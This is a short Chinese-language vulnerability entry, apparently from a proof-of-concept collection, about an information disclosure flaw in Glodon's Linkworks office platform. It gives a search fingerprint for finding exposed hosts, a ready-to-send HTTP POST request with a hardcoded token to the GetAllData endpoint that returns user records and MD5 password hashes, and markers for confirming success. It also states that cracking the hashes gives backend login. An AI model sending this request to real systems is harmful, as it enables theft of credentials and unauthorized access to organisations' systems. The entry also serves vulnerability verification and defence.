﻿# 广联达Linkworks GetAllData 信息泄露漏洞

> 更新时间：2024-02-26

> 漏洞编号：

> 漏洞说明：广联达-Linkworks协同办公管理平台 GetAllData接口处存在信息泄露漏洞，恶意可获取用户名密码等敏感信息。破解密码md5可登录后台。

> 漏洞特征：body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"

> 验证脚本：HTTP

```
POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
 
Token=!@#$asdf$#@!&DataType=user
```

> 响应代码特征：200

> 响应内容特征：USR_CODE

> 上传文件定位：

> 验证文件来源：广联达Linkworks GetAllData 信息泄露漏洞.poc